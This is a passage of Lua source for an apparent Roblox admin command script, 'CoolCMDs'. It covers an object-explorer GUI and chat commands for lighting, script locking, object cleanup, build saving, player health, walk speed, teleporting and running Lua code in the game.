ChoiceLoadIcon.Changed:connect(function(Property) if Property == "BackgroundTransparency" and ChoiceLoadIcon.BackgroundTransparency ~= 1 then ChoiceLoadIcon.BackgroundTransparency = 1 end end)
ChoiceLoadIcon.Parent = ChoiceLoad
local ChoiceProperties = Choice:Clone()
ChoiceProperties.Text = string.rep(" ", 8).. "Edit..."
ChoiceProperties.Size = UDim2.new(0, 75 - 2, 1, -2)
ChoiceProperties.Position = UDim2.new(0, (75 * 2) + (1 * 2), 0, 1)
ChoiceProperties.Parent = MenuBar1
ChoiceProperties.MouseEnter:connect(function() ChoiceProperties.BackgroundColor3 = Color3.new(0.5, 0.5, 0.5) ChoiceProperties.BorderSizePixel = 1 end)
ChoiceProperties.MouseLeave:connect(function() ChoiceProperties.BackgroundColor3 = Color3.new(0.75, 0.75, 0.75) ChoiceProperties.BorderSizePixel = 0 end)
ChoiceProperties.MouseButton1Down:connect(function() ChoiceProperties.BackgroundColor3 = Color3.new(0.4, 0.4, 0.4) end)
ChoiceProperties.MouseButton1Up:connect(function() ChoiceProperties.BackgroundColor3 = Color3.new(0.5, 0.5, 0.5)
local SortType2 = 1
local Popup = CoolCMDs.Functions.GetModule("GuiSupport").WindowCreate(UDim2.new(0.5, -500 / 2, 0.5, -500 / 2), UDim2.new(0, 500, 0, 500), Gui, "Set Propertes", true, true, true, true, true, true, true)
Popup.Icon.Image = "http://www.Roblox.com/Asset/?id=43318689"
local Previous = Instance.new("TextButton")
Previous.Name = "Previous"
Previous.Text = "<"
Previous.BackgroundColor3 = Color3.new(0.4, 0.4, 0.4)
Previous.BorderColor3 = Color3.new(0, 0, 0)
Previous.BorderSizePixel = 1
Previous.TextColor3 = Color3.new(0, 0, 0)
Previous.Size = UDim2.new(0, 20, 0, 20)
Previous.Position = UDim2.new(0, 5, 1, -75)
Previous.Parent = Popup.Content
local Center = Instance.new("TextLabel")
Center.Name = "Center"
Center.Text = "0 to 0 of 0"
Center.BackgroundColor3 = Color3.new(0.4, 0.4, 0.4)
Center.BorderColor3 = Color3.new(0, 0, 0)
Center.BorderSizePixel = 1
Center.TextColor3 = Color3.new(0, 0, 0)
Center.FontSize = "Size14"
Center.Size = UDim2.new(1, -50, 0, 20)
Center.Position = UDim2.new(0, 25, 1, -75)
Center.Parent = Popup.Content
local Next = Instance.new("TextButton")
Next.Text = ">"
Next.BackgroundColor3 = Color3.new(0.4, 0.4, 0.4)
Next.BorderColor3 = Color3.new(0, 0, 0)
Next.BorderSizePixel = 1
Next.TextColor3 = Color3.new(0, 0, 0)
Next.Size = UDim2.new(0, 20, 0, 20)
Next.Position = UDim2.new(1, -25, 1, -75)
Next.Parent = Popup.Content
local ListFrameHeader = CoolCMDs.Functions.GetModule("GuiSupport").WindowControls.ListFrame.New()
ListFrameHeader.Size = UDim2.new(1, -10, 0, 20)
ListFrameHeader.Position = UDim2.new(0, 5, 0, 5)
ListFrameHeader.Parent = Popup.Content
CoolCMDs.Functions.GetModule("GuiSupport").WindowControls.ListFrame.ListUpdate(ListFrameHeader, {"Variable\tType\tValue"}, 2)
local ListFrameProperties = CoolCMDs.Functions.GetModule("GuiSupport").WindowControls.ListFrame.New()
ListFrameProperties.Size = UDim2.new(1, -10, 1, -100)
ListFrameProperties.Position = UDim2.new(0, 5, 0, 25)
ListFrameProperties.Parent = Popup.Content
local function UpdateProperties(...)
local Properties, Types = CoolCMDs.Functions.GetModule("RobloxProperties").GetProperties(Object)
local List = {}
for i = 1, #Properties do
local Result = "Nil"
if Types[i] == "Instance" then
Result = Object[Properties[i]]:GetFullName()
elseif Types[i] == "Struct.Vector2" then
Result = "(" ..Object[Properties[i]].x.. ", " ..Object[Properties[i]].y.. ")"
elseif Types[i] == "Struct.Vector3" then
Result = "(" ..Object[Properties[i]].x.. ", " ..Object[Properties[i]].y.. ", " ..Object[Properties[i]].z.. ")"
elseif Types[i] == "Struct.CFrame" then
local x, y, z = Object[Properties[i]]:toEulerAnglesXYZ()
Result = "(" ..Object[Properties[i]].p.x.. ", " ..Object[Properties[i]].p.y.. ", " ..Object[Properties[i]].p.z.. "), (" ..x.. ", " ..y.. ", " ..z.. ")"
elseif Types[i] == "Struct.BrickColor" then
Result = Object[Properties[i]].Name.. " (ID " ..Object[Properties[i]].Number.. ", (" ..Object[Properties[i]].r.. ", " ..Object[Properties[i]].g.. ", " ..Object[Properties[i]].b.. ")"
elseif Types[i] == "Struct.Color3" then
Result = "(" ..Object[Properties[i]].r.. ", " ..Object[Properties[i]].g.. ", " ..Object[Properties[i]].b.. ")"
elseif Types[i] == "Struct.UDim" then
Result = "(" ..Object[Properties[i]].Scale.. ", " ..Object[Properties[i]].Offset.. ")"
elseif Types[i] == "Struct.UDim2" then
Result = "(" ..Object[Properties[i]].X.Scale.. ", " ..Object[Properties[i]].X.Offset.. ", " ..Object[Properties[i]].Y.Scale.. ", " ..Object[Properties[i]].Y.Offset.. ")"
elseif Types[i] == "Struct.Ray" then
Result = "Origin: " ..Object[Properties[i]].Origin.x.. ", " ..Object[Properties[i]].Origin.y.. ", " ..Object[Properties[i]].Origin.z.. "). Direction: " ..Object[Properties[i]].Direction.x.. ", " ..Object[Properties[i]].Direction.y.. ", " ..Object[Properties[i]].Direction.z.. ")."
elseif Types[i] == "Struct.Axes" then
Result = Object[Properties[i]].X.. ", " ..Object[Properties[i]].Y.. ", " ..Object[Properties[i]].Z
elseif Types[i] == "Faces" then
if Object[Properties[i]].Right == true then
Result = (Result ~= "" and Result.. ", " or "").. "Right"
end
if Object[Properties[i]].Top == true then
Result = (Result ~= "" and Result.. ", " or "").. "Top"
end
if Object[Properties[i]].Back == true then
Result = (Result ~= "" and Result.. ", " or "").. "Back"
end
if Object[Properties[i]].Left == true then
Result = (Result ~= "" and Result.. ", " or "").. "Left"
end
if Object[Properties[i]].Bottom == true then
Result = (Result ~= "" and Result.. ", " or "").. "Bottom"
end
if Object[Properties[i]].Front == true then
Result = (Result ~= "" and Result.. ", " or "").. "Front"
end
elseif Types[i] == "String" then
Result = "\"" ..Object[Properties[i]].. "\""
else
Result = tostring(Object[Properties[i]])
end
table.insert(List, Properties[i].. "\t" ..Types[i].. "\t" ..Result)
end
table.sort(List, function(a, b) return string.lower(CoolCMDs.Functions.Explode("\t", a)[SortType2]) < string.lower(CoolCMDs.Functions.Explode("\t", b)[SortType2]) end)
CoolCMDs.Functions.GetModule("GuiSupport").WindowControls.ListFrame.ListUpdate(ListFrameProperties, List, 1, ...)
Center.Text = ListFrameProperties.ListIndex.Value.. " to " ..(ListFrameProperties.ListIndex.Value + #ListFrameProperties:children() - 2).. " of " ..#Properties
for _, Tag in pairs(ListFrameProperties:children()) do
for _, Table in pairs(Tag:children()) do
pcall(function()
Table.MouseButton1Down:connect(function()
Popup.StatusBar.Text = "Currently, editing properties has not been implimented."
end)
end)
end
end
end
coroutine.wrap(function()
CoolCMDs.Functions.GetModule("GuiSupport").WindowControls.ListFrame.ListUpdate(ListFrameProperties, {"Loading..."}, 1)
wait(2.5)
UpdateProperties()
end)()
for i, Table in pairs(ListFrameHeader.Tag1:children()) do
Table.MouseButton1Down:connect(function()
SortType2 = i
UpdateProperties()
end)
end
Previous.MouseButton1Up:connect(function() UpdateProperties(-1, "page") end)
Next.MouseButton1Up:connect(function() UpdateProperties(1, "page") end)
local TextButton = Instance.new("TextButton")
TextButton.Text = "Apply"
TextButton.BackgroundColor3 = Color3.new(0.4, 0.4, 0.4)
TextButton.BorderColor3 = Color3.new(0, 0, 0)
TextButton.BorderSizePixel = 1
TextButton.TextColor3 = Color3.new(0, 0, 0)
TextButton.Size = UDim2.new(0, 80, 0, 35)
TextButton.Position = UDim2.new(1, -105, 1, -45)
TextButton.Parent = Popup.Content
TextButton.MouseButton1Up:connect(function()
end)
local TextButton = Instance.new("TextButton")
TextButton.Text = "Refresh"
TextButton.BackgroundColor3 = Color3.new(0.4, 0.4, 0.4)
TextButton.BorderColor3 = Color3.new(0, 0, 0)
TextButton.BorderSizePixel = 1
TextButton.TextColor3 = Color3.new(0, 0, 0)
TextButton.Size = UDim2.new(0, 80, 0, 35)
TextButton.Position = UDim2.new(0, 25, 1, -45)
TextButton.Parent = Popup.Content
TextButton.MouseButton1Up:connect(function()
end)
end)
local ChoicePropertiesIcon = ChoiceIcon:Clone()
ChoicePropertiesIcon.Image = "http://www.Roblox.com/Asset/?id=43318689"
ChoicePropertiesIcon.Changed:connect(function(Property) if Property == "BackgroundTransparency" and ChoicePropertiesIcon.BackgroundTransparency ~= 1 then ChoicePropertiesIcon.BackgroundTransparency = 1 end end)
ChoicePropertiesIcon.Parent = ChoiceProperties
local ChoiceDelete = Choice:Clone()
ChoiceDelete.Text = string.rep(" ", 8).. "Delete"
ChoiceDelete.Size = UDim2.new(0, 75 - 2, 1, -2)
ChoiceDelete.Position = UDim2.new(0, (75 * 3) + (1 * 3), 0, 1)
ChoiceDelete.Parent = MenuBar1
ChoiceDelete.MouseEnter:connect(function() ChoiceDelete.BackgroundColor3 = Color3.new(0.5, 0.5, 0.5) ChoiceDelete.BorderSizePixel = 1 end)
ChoiceDelete.MouseLeave:connect(function() ChoiceDelete.BackgroundColor3 = Color3.new(0.75, 0.75, 0.75) ChoiceDelete.BorderSizePixel = 0 end)
ChoiceDelete.MouseButton1Down:connect(function() ChoiceDelete.BackgroundColor3 = Color3.new(0.4, 0.4, 0.4) end)
ChoiceDelete.MouseButton1Up:connect(function() ChoiceDelete.BackgroundColor3 = Color3.new(0.5, 0.5, 0.5)
if Object.Parent ~= nil then
local Delete = Object
Object = Object.Parent
if pcall(function() Delete:Remove() end) == false then
Object = Delete
ObjectChildren = Object:children()
UpdatePage()
Window.StatusBar.Text = "Error: Object could not be removed!"
wait(5)
Window.StatusBar.Text = ""
else
ObjectChildren = Object:children()
UpdatePage()
end
else
Window.StatusBar.Text = "Error: Object has no parent!"
wait(5)
Window.StatusBar.Text = ""
end
end)
local ChoiceDeleteIcon = ChoiceIcon:Clone()
ChoiceDeleteIcon.Image = "http://www.Roblox.com/Asset/?id=42736686"
ChoiceDeleteIcon.Changed:connect(function(Property) if Property == "BackgroundTransparency" and ChoiceDeleteIcon.BackgroundTransparency ~= 1 then ChoiceDeleteIcon.BackgroundTransparency = 1 end end)
ChoiceDeleteIcon.Parent = ChoiceDelete
local ChoiceRefresh = Choice:Clone()
ChoiceRefresh.Text = string.rep(" ", 8).. "Refresh"
ChoiceRefresh.Size = UDim2.new(0, 75 - 2, 1, -2)
ChoiceRefresh.Position = UDim2.new(0, (75 * 4) + (1 * 4), 0, 1)
ChoiceRefresh.Parent = MenuBar1
ChoiceRefresh.MouseEnter:connect(function() ChoiceRefresh.BackgroundColor3 = Color3.new(0.5, 0.5, 0.5) ChoiceRefresh.BorderSizePixel = 1 end)
ChoiceRefresh.MouseLeave:connect(function() ChoiceRefresh.BackgroundColor3 = Color3.new(0.75, 0.75, 0.75) ChoiceRefresh.BorderSizePixel = 0 end)
ChoiceRefresh.MouseButton1Down:connect(function() ChoiceRefresh.BackgroundColor3 = Color3.new(0.4, 0.4, 0.4) end)
ChoiceRefresh.MouseButton1Up:connect(function() ChoiceRefresh.BackgroundColor3 = Color3.new(0.5, 0.5, 0.5)
ObjectChildren = Object:children()
UpdatePage()
end)
local ChoiceRefreshIcon = ChoiceIcon:Clone()
ChoiceRefreshIcon.Image = "http://www.Roblox.com/Asset/?id=43215825"
ChoiceRefreshIcon.Changed:connect(function(Property) if Property == "BackgroundTransparency" and ChoiceRefreshIcon.BackgroundTransparency ~= 1 then ChoiceRefreshIcon.BackgroundTransparency = 1 end end)
ChoiceRefreshIcon.Parent = ChoiceRefresh
local ChoiceUpLevel = Choice:Clone()
ChoiceUpLevel.Text = string.rep(" ", 8).. "Up Level"
ChoiceUpLevel.Size = UDim2.new(0, 75 - 2, 1, -2)
ChoiceUpLevel.Position = UDim2.new(0, (75 * 5) + (1 * 5), 0, 1)
ChoiceUpLevel.Parent = MenuBar1
ChoiceUpLevel.MouseEnter:connect(function() ChoiceUpLevel.BackgroundColor3 = Color3.new(0.5, 0.5, 0.5) ChoiceUpLevel.BorderSizePixel = 1 end)
ChoiceUpLevel.MouseLeave:connect(function() ChoiceUpLevel.BackgroundColor3 = Color3.new(0.75, 0.75, 0.75) ChoiceUpLevel.BorderSizePixel = 0 end)
ChoiceUpLevel.MouseButton1Down:connect(function() ChoiceUpLevel.BackgroundColor3 = Color3.new(0.4, 0.4, 0.4) end)
ChoiceUpLevel.MouseButton1Up:connect(function() ChoiceUpLevel.BackgroundColor3 = Color3.new(0.5, 0.5, 0.5)
if Object.Parent ~= nil then
Object = Object.Parent
ObjectChildren = Object:children()
UpdatePage()
else
Window.StatusBar.Text = "Error: Object has no parent!"
wait(5)
Window.StatusBar.Text = ""
end
end)
local ChoiceUpLevelIcon = ChoiceIcon:Clone()
ChoiceUpLevelIcon.Image = "http://www.Roblox.com/Asset/?id=42724903"
ChoiceUpLevelIcon.Changed:connect(function(Property) if Property == "BackgroundTransparency" and ChoiceUpLevelIcon.BackgroundTransparency ~= 1 then ChoiceUpLevelIcon.BackgroundTransparency = 1 end end)
ChoiceUpLevelIcon.Parent = ChoiceUpLevel
local ChoiceHome = Choice:Clone()
ChoiceHome.Text = string.rep(" ", 8).. "Home"
ChoiceHome.Size = UDim2.new(0, 75 - 2, 1, -2)
ChoiceHome.Position = UDim2.new(0, (75 * 6) + (1 * 6), 0, 1)
ChoiceHome.Parent = MenuBar1
ChoiceHome.MouseEnter:connect(function() ChoiceHome.BackgroundColor3 = Color3.new(0.5, 0.5, 0.5) ChoiceHome.BorderSizePixel = 1 end)
ChoiceHome.MouseLeave:connect(function() ChoiceHome.BackgroundColor3 = Color3.new(0.75, 0.75, 0.75) ChoiceHome.BorderSizePixel = 0 end)
ChoiceHome.MouseButton1Down:connect(function() ChoiceHome.BackgroundColor3 = Color3.new(0.4, 0.4, 0.4) end)
ChoiceHome.MouseButton1Up:connect(function() ChoiceHome.BackgroundColor3 = Color3.new(0.5, 0.5, 0.5)
Object = Home
ObjectChildren = Object:children()
UpdatePage()
end)
local ChoiceHomeIcon = ChoiceIcon:Clone()
ChoiceHomeIcon.Image = "http://www.Roblox.com/Asset/?id=43216297"
ChoiceHomeIcon.Changed:connect(function(Property) if Property == "BackgroundTransparency" and ChoiceHomeIcon.BackgroundTransparency ~= 1 then ChoiceHomeIcon.BackgroundTransparency = 1 end end)
ChoiceHomeIcon.Parent = ChoiceHome
end)()
end
end
end
end, "Explorer", "Creates a GUI in a player allowing you to explore the contents of the game. The controls are simple, and extra help is provided under the Help submenu.", "player")

CoolCMDs.Functions.CreateCommand("lighting", 1, function(Message, MessageSplit, Speaker, Self)
if MessageSplit[1]:lower() == "dawn" then
game:service("Lighting").Brightness = 2
game:service("Lighting").GeographicLatitude = 41.73
game:service("Lighting").Ambient = Color3.new(127 / 255, 127 / 255, 150 / 255)
game:service("Lighting").ColorShift_Top = Color3.new(0, 0, 25 / 255)
game:service("Lighting").ColorShift_Bottom = Color3.new(0, 0, 0)
game:service("Lighting").ShadowColor = Color3.new(179 / 255, 179 / 255, 179 / 255)
game:service("Lighting").TimeOfDay = "07:00:00"
end
if MessageSplit[1]:lower() == "day" then
game:service("Lighting").Brightness = 3
game:service("Lighting").GeographicLatitude = 41.73
game:service("Lighting").Ambient = Color3.new(150 / 255, 127 / 255, 150 / 255)
game:service("Lighting").ColorShift_Top = Color3.new(10 / 255, 10 / 255, 10 / 255)
game:service("Lighting").ColorShift_Bottom = Color3.new(0, 0, 0)
game:service("Lighting").ShadowColor = Color3.new(179 / 255, 179 / 255, 179 / 255)
game:service("Lighting").TimeOfDay = "12:00:00"
end
if MessageSplit[1]:lower() == "dusk" then
game:service("Lighting").Brightness = 2
game:service("Lighting").GeographicLatitude = 41.73
game:service("Lighting").Ambient = Color3.new(150 / 255, 110 / 255, 110 / 255)
game:service("Lighting").ColorShift_Top = Color3.new(50 / 255, 10 / 255, 10 / 255)
game:service("Lighting").ColorShift_Bottom = Color3.new(0, 0, 0)
game:service("Lighting").ShadowColor = Color3.new(179 / 255, 179 / 255, 179 / 255)
game:service("Lighting").TimeOfDay = "17:55:00"
end
if MessageSplit[1]:lower() == "night" then
game:service("Lighting").Brightness = 5
game:service("Lighting").GeographicLatitude = 41.73
game:service("Lighting").Ambient = Color3.new(20 / 255, 20 / 255, 20 / 255)
game:service("Lighting").ColorShift_Top = Color3.new(0, 0, 25 / 255)
game:service("Lighting").ColorShift_Bottom = Color3.new(0, 0, 0)
game:service("Lighting").ShadowColor = Color3.new(200 / 255, 200 / 255, 200 / 255)
game:service("Lighting").TimeOfDay = "21:00:00"
end
if MessageSplit[1]:lower() == "default" then
game:service("Lighting").Brightness = 1
game:service("Lighting").GeographicLatitude = 41.73
game:service("Lighting").Ambient = Color3.new(128 / 255, 128 / 255, 128 / 255)
game:service("Lighting").ColorShift_Top = Color3.new(0, 0, 0)
game:service("Lighting").ColorShift_Bottom = Color3.new(0, 0, 0)
game:service("Lighting").ShadowColor = Color3.new(179 / 255, 179 / 255, 184 / 255)
game:service("Lighting").TimeOfDay = "14:00:00"
end
if MessageSplit[1]:lower() == "black" then
game:service("Lighting").Brightness = 0
game:service("Lighting").GeographicLatitude = 90
game:service("Lighting").Ambient = Color3.new(0, 0, 0)
game:service("Lighting").ColorShift_Top = Color3.new(0, 0, 0)
game:service("Lighting").ColorShift_Bottom = Color3.new(0, 0, 0)
game:service("Lighting").ShadowColor = Color3.new(1, 1, 1)
game:service("Lighting").TimeOfDay = "00:00:00"
end
if MessageSplit[1]:lower() == "shift" then
if Self.Shift == nil then Self.Shift = false end
if Self.ShiftTime == nil then Self.ShiftTime = 10 end
if Self.Shift == true then Self.Shift = false else Self.Shift = true end
local h = tonumber(CoolCMDs.Functions.Explode(":", game.Lighting.TimeOfDay)[1])
local m = tonumber(CoolCMDs.Functions.Explode(":", game.Lighting.TimeOfDay)[2])
local s = tonumber(CoolCMDs.Functions.Explode(":", game.Lighting.TimeOfDay)[3])
while Self.Shift == true and CoolCMDs ~= nil do
s = s + 10
if s >= 60 then
m = m + 1
s = 0
end
if m > 60 then
h = h + 1
m = 0
end
if h > 24 then
h = 0
end
game:service("Lighting").TimeOfDay = h.. ":" ..m.. ":" ..s
wait()
end
end
if MessageSplit[1]:lower() == "ambient" then pcall(function() game:service("Lighting").Ambient = Color3.new(tonumber(MessageSplit[2]), tonumber(MessageSplit[3]), tonumber(MessageSplit[4])) end) end
if MessageSplit[1]:lower() == "bottom" then pcall(function() game:service("Lighting").ColorShift_Bottom = Color3.new(tonumber(MessageSplit[2]), tonumber(MessageSplit[3]), tonumber(MessageSplit[4])) end) end
if MessageSplit[1]:lower() == "top" then pcall(function() game:service("Lighting").ColorShift_Top = Color3.new(tonumber(MessageSplit[2]), tonumber(MessageSplit[3]), tonumber(MessageSplit[4])) end) end
if MessageSplit[1]:lower() == "shadow" then pcall(function() game:service("Lighting").ShadowColor = Color3.new(tonumber(MessageSplit[2]), tonumber(MessageSplit[3]), tonumber(MessageSplit[4])) end) end
if MessageSplit[1]:lower() == "brightness" then pcall(function() game:service("Lighting").Brightness = Color3.new(tonumber(MessageSplit[2]), tonumber(MessageSplit[3]), tonumber(MessageSplit[4])) end) end
if MessageSplit[1]:lower() == "latitude" then pcall(function() game:service("Lighting").GeographicLatitude = tonumber(MessageSplit[2]) end) end
if MessageSplit[1]:lower() == "time" or MessageSplit[1]:lower() == "timeofday" then pcall(function() game:service("Lighting").TimeOfDay = MessageSplit[2] end) end
end, "Lighting", "Change the lighting color.", "[dawn, day, night, default, black], shift, [ambient, bottom, top, shadow], brightness" ..CoolCMDs.Data.SplitCharacter.. "0-5, latitude" ..CoolCMDs.Data.SplitCharacter.. "0-360, [time, timeofday]" ..CoolCMDs.Data.SplitCharacter.. "0-24:0-60:0-60")

CoolCMDs.Functions.CreateCommand({"lockscript", "lock script", "lockscripts", "lock scripts", "ls"}, 1, function(Message, MessageSplit, Speaker, Self)
if MessageSplit[1]:lower() == "0" or MessageSplit[1]:lower() == "false" then
game:service("ScriptContext").ScriptsDisabled = false
if Self.new ~= nil then
Instance.new = Self.new
Self.new = nil
end
for _, Scripts in pairs(CoolCMDs.Functions.GetRecursiveChildren(nil, "script", 2)) do
if Scripts ~= script and Scripts:IsA("BaseScript") then
Scripts.Disabled = false
end
end
CoolCMDs.Functions.CreateMessage("Message", "Scripts unlocked.", 1)
elseif MessageSplit[1]:lower() == "1" or MessageSplit[1]:lower() == "true" then
local LockMessage = CoolCMDs.Functions.CreateMessage("Message", "Locking scripts...")
game:service("ScriptContext").ScriptsDisabled = true
if pcall(function() local _ = Instance.new("Part") end) == true then
Self.new = Instance.new
Instance.new = function() error("No objects are currently allowed.") end
end
for _, Scripts in pairs(CoolCMDs.Functions.GetRecursiveChildren(nil, "script", 2)) do
if Scripts ~= script and Scripts:IsA("BaseScript") then
Scripts.Disabled = true
end
end
LockMessage.Text = "Scripts locked."
wait(5)
LockMessage:Remove()
end
end, "Lock Scripts", "Disables all new scripts and all currently running scripts (besides itself).", "[0 (false), 1 (true)]")

CoolCMDs.Functions.CreateCommand({"clean"}, 5, function(Message, MessageSplit, Speaker, Self)
if #MessageSplit < 3 then return end
local CleanType = MessageSplit[#MessageSplit - 1]
if CleanType == nil then CleanType = "1" end
CleanType = CleanType:lower()
if CleanType == "1" or CleanType == "name" then CleanType = 1 end
if CleanType == "2" or CleanType == "class" or CleanType == "classname" then CleanType = 2 end
if CleanType == "3" or CleanType == "type" or CleanType == "isa" then CleanType = 3 end
if CleanType == "4" or CleanType == "all" then CleanType = 4 end
local CleanExtra = MessageSplit[#MessageSplit]
if CleanExtra == nil then CleanExtra = "" end
for i = 1, #MessageSplit - 2 do
for _, Part in pairs(CoolCMDs.Functions.GetRecursiveChildren(nil, MessageSplit[i], CleanType)) do
local _, CanClean = pcall(function()
if Part == script then
return false
end
if (string.match(Part.Name, "CoolCMDs") and Part.Parent == game:service("ScriptContext")) or Part.className == "Lighting" then return false end
if string.match(CleanExtra, "nochar") then
for _, Player in pairs(game:service("Players"):GetPlayers()) do
if Part == Player.Character or Part:IsDescendantOf(Player.Character) then return false end
end
end
if string.match(CleanExtra, "noplayer") then
for _, Player in pairs(game:service("Players"):GetPlayers()) do
if Part:IsDescendantOf(Player) or Part == Player then return false end
end
end
if string.match(CleanExtra, "nobase") then
if Part.Parent == game:service("Workspace") and Part.Name == "Base" then
return false
end
end
if string.match(CleanExtra, "noscript") then
if Part:IsA("BaseScript") then
return false
end
end
if string.match(CleanExtra, "stopscript") then
if Part:IsA("BaseScript") then
Part.Disabled = true
end
end
if string.match(CleanExtra, "stopsound") then
if Part:IsA("Sound") then
for i = 1, 10 do
Part.SoundId = ""
Part.Looped = false
Part.Volume = 0
Part.Pitch = 0
Part:Stop()
wait()
end
end
end
return true
end)
if CanClean == true then
--local heent = Instance.new("Hint", workspace)
--heent.Text = Part.className.. "  " ..Part.Name
--wait(1)
--heent:Remove()
pcall(function() Part:Remove() end)
end
end
end
end, "Clean", "Cleans the game of all obejcts with a certain Name or className or inherited class (or all). Extra arguments: nochar, noplayer, nobase, noscript, stopscript, stopsound.", "[name, classname, inherited]" ..CoolCMDs.Data.SplitCharacter.. "[...]" ..CoolCMDs.Data.SplitCharacter.. "[[1, name], [2, class], [3, inherited], [4, all]]" ..CoolCMDs.Data.SplitCharacter.. "extra arguments")

CoolCMDs.Functions.CreateCommand("game", 5, function(Message, MessageSplit, Speaker, Self)
if #MessageSplit < 2 then return end
local BuildType = MessageSplit[1]
if BuildType == nil then BuildType = "1" end
BuildType = BuildType:lower()
if BuildType == "1" or BuildType == "save" then BuildType = 1 end
if BuildType == "2" or BuildType == "load" then BuildType = 2 end
local BuildArg1 = MessageSplit[2]
if BuildArg1 == nil then BuildArg1 = "default" end
if Self.Saves == nil then Self.Saves = {} end
if BuildType == 1 then
Self.Saves[BuildArg1] = {}
Self.Saves[BuildArg1].Model = Instance.new("Model")
for _, Part in pairs(CoolCMDs.Functions.GetRecursiveChildren(game:service("Workspace"))) do
if (function()
for _, Player in pairs(game:service("Players"):GetPlayers()) do
if Part == Player or Part:IsDescendantOf(Player) or Player.Character or Part:IsDescendantOf(Player.Character) then
return false
end
end
return true
end)() == true then
pcall(function() Part:Clone().Parent = Self.Saves[BuildArg1].Model end)
end
end
CoolCMDs.Functions.CreateMessage("Message", "Saved " ..#Self.Saves[BuildArg1].Model:children().. " objects to the save file \"" ..BuildArg1.. "\".", 5)
elseif BuildType == 2 then
if Self.Saves[BuildArg1] ~= nil then
for _, Part in pairs(CoolCMDs.Functions.GetRecursiveChildren(game:service("Workspace"))) do
if (function()
for _, Player in pairs(game:service("Players"):GetPlayers()) do
if Part == Player or Part:IsDescendantOf(Player) or Player.Character or Part:IsDescendantOf(Player.Character) then
return false
end
end
return true
end)() == true then
pcall(function() Part.Disabled = true end)
pcall(function() Part:Remove() end)
end
end
local Loading = CoolCMDs.Functions.CreateMessage("Hint", "Loading " ..#Self.Saves[BuildArg1].Model:children().. " objects from the save file \"" ..BuildArg1.. "\"...")
for _, Part in pairs(Self.Saves[BuildArg1].Model:children()) do
pcall(function() local x = Part:Clone() x:MakeJoints() x.Parent = game:service("Workspace") x:MakeJoints() end)
end
Loading:Remove()
CoolCMDs.Functions.CreateMessage("Message", "Loaded " ..#Self.Saves[BuildArg1].Model:children().. " objects from the save file \"" ..BuildArg1.. "\" successfully.", 5)
else
CoolCMDs.Functions.CreateMessage("Message", "Save file \"" ..BuildArg1.. "\" does not exist.", 5)
end
end
end, "Build Saving and Loading", "Saves and loads builds. save: Saves a build to [save name]. load: Loads a build from [save name].", "[save, load]" ..CoolCMDs.Data.SplitCharacter.. "[save name]")

CoolCMDs.Functions.CreateCommand("health", 1, function(Message, MessageSplit, Speaker, Self)
if #MessageSplit < 2 then return false end
local Health = MessageSplit[#MessageSplit]
if Health == nil then Health = "" end
Health = Health:lower()
if Health == "math.huge" then
Health = math.huge
elseif Health == "" or tonumber(Health) == nil then
Health = 0
else
Health = tonumber(Health)
end
Health = math.abs(Health)
for i = 1, #MessageSplit - 1 do
for _, PlayerList in pairs(game:service("Players"):GetPlayers()) do
if string.match(PlayerList.Name:lower(), MessageSplit[i]:lower()) and PlayerList.Character ~= nil then
if PlayerList.Character:FindFirstChild("Humanoid") ~= nil then
if Health > PlayerList.Character.Humanoid.MaxHealth then
PlayerList.Character.Humanoid.MaxHealth = Health
else
PlayerList.Character.Humanoid.MaxHealth = 100
if Health > PlayerList.Character.Humanoid.MaxHealth then
PlayerList.Character.Humanoid.MaxHealth = Health
end
end
PlayerList.Character.Humanoid.Health = Health
end
end
end
end
end, "Health", "Set the health of a player's character. ", "player" ..CoolCMDs.Data.SplitCharacter.. "[...]" ..CoolCMDs.Data.SplitCharacter.. "[health (number), math.huge, random, my health]")

CoolCMDs.Functions.CreateCommand("lua", 1, function(Message, MessageSplit, Speaker, Self)
CoolCMDs.Functions.CreateScript(Message, game:service("Workspace"), true)
end, "Lua Run", "Creates a new script.", "source")

CoolCMDs.Functions.CreateCommand({"luanodebug", "luandb"}, 1, function(Message, MessageSplit, Speaker, Self)
CoolCMDs.Functions.CreateScript(Message, game:service("Workspace"), false)
end, "Lua Run (No Debug)", "Creates a new script without error output.", "source")

CoolCMDs.Functions.CreateCommand({"walkspeed", "ws"}, 1, function(Message, MessageSplit, Speaker, Self)
if #MessageSplit < 2 then return false end
for i = 1, #MessageSplit - 1 do
for _, PlayerList in pairs(game:service("Players"):GetPlayers()) do
if string.match(PlayerList.Name:lower(), MessageSplit[i]:lower()) and PlayerList.Character ~= nil then
if PlayerList.Character:FindFirstChild("Humanoid") ~= nil then
pcall(function() PlayerList.Character.Humanoid.WalkSpeed = tonumber(MessageSplit[#MessageSplit]) end)
end
end
end
end
end, "WalkSpeed", "Set the WalkSpeed of a player's character. ", "player" ..CoolCMDs.Data.SplitCharacter.. "[...]" ..CoolCMDs.Data.SplitCharacter.. "[speed (number), math.huge, random, my walkspeed]")

CoolCMDs.Functions.CreateCommand({"teleport"}, 1, function(Message, MessageSplit, Speaker, Self)
local Position = MessageSplit[#MessageSplit]:lower()
local Player = nil
if Position == "" or Position == "me" then
if Speaker.Character ~= nil then
if Speaker.Character:FindFirstChild("Torso") ~= nil then
Position = Speaker.Character.Torso.CFrame
Player = Speaker
end
end
elseif #CoolCMDs.Functions.Explode(", ", Position) == 3 then
Position = CFrame.new(CoolCMDs.Functions.Explode(", ", Position)[1], CoolCMDs.Functions.Explode(", ", Position)[2], CoolCMDs.Functions.Explode(", ", Position)[3])
else
for _, PlayerList in pairs(game:service("Players"):GetPlayers()) do
if string.match(PlayerList.Name:lower(), Position:lower()) and PlayerList.Character ~= nil then
if PlayerList.Character:FindFirstChild("Torso") ~= nil then
Position = PlayerList.Character.Torso.CFrame
Player = PlayerList
break
end
end
end
end
if type(Position) == "string" then return end
local i = 1
for x = 1, #MessageSplit - 1 do
for _, PlayerList in pairs(game:service("Players"):GetPlayers()) do
if string.match(PlayerList.Name:lower(), MessageSplit[x]:lower()) and PlayerList.Character ~= nil and PlayerList ~= Player then
i = i + 1
if PlayerList.Character:FindFirstChild("Torso") ~= nil then
PlayerList.Character.Torso.CFrame = Position * CFrame.new(0, 4 * i, 0)
PlayerList.Character.Torso.Velocity = Vector3.new(0, 0, 0)
PlayerList.Character.Torso.RotVelocity = Vector3.new(0, 0, 0)
else
PlayerList.Character:MoveTo((Position * CFrame.new(0, 4 * i, 0)).p)
end
end
end
end
end, "Teleport", "Teleport players to other players. ", "player to teleport" ..CoolCMDs.Data.SplitCharacter.. "[...]" ..CoolCMDs.Data.SplitCharacter.. "player to teleport to, or [x, y, z]")

